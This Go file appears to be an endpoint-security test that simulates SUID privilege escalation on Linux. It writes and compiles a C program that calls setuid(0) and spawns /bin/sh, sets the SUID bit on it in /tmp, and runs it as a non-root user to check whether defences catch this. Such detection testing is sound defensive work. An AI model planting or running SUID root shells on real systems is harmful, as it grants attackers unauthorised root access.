//go:build linux
// +build linux

/*
ID: 28eb3afe-131d-48b0-a8fc-9784f3d54f3c
NAME: Privilege Escalation via SUID/SGID
CREATED: 2024-06-17
scenario: execution of a process with SUID/SGID permissions
non-root user runs process with elevated privs
*/

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"

	Endpoint "github.com/preludeorg/test/endpoint"
)

/*
simple C code for SUID that spawns shell
*/
func createSUIDBinary() {
	code := `
	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>

	int main() {
		setuid(0);
		setgid(0);
		system("/bin/sh");
		return 0;
	}
	`
	// write code to temp file
	err := os.WriteFile("/tmp/suid_shell.c", []byte(code), 0644)
	if err != nil {
		fmt.Println("[-] failed to write SUID C code:", err)
		Endpoint.Stop(256) // unexpected error
		return
	}

	// compile to binary
	cmd := exec.Command("gcc", "-o", "/tmp/suid_shell", "/tmp/suid_shell.c")
	err = cmd.Run()
	if err != nil {
		fmt.Println("[-] failed to compile C code:", err)
		Endpoint.Stop(256) // unexpected error
		return
	}

	// set SUID on binary
	err = os.Chmod("/tmp/suid_shell", 04555)
	if err != nil {
		fmt.Println("[-] failed to set SUID bit on binary:", err)
		Endpoint.Stop(256) // unexpected error
		return
	}

}

/*
run SUID binary as non-root user
*/

func executeSUIDBinary() {
	cmd := exec.Command("/tmp/suid_shell")
	// non-root user ID + non-root group ID
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Credential: &syscall.Credential{
			Uid: 1000,
			Gid: 1000,
		},
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("[-] failed to execute SUID binary:", err)
		Endpoint.Stop(101) // unprotected
		return
	}

	fmt.Println("[+] SUID binary executed successfully:", string(output))
	Endpoint.Stop(101) // unprotected
}

func test() {
	fmt.Println("[+] creating + setting up SUID binary")
	createSUIDBinary()

	fmt.Println("[+] executing SUID binary")
	executeSUIDBinary()

	fmt.Println("[+] test completed")
}

func main() {
	Endpoint.Start(test)
}
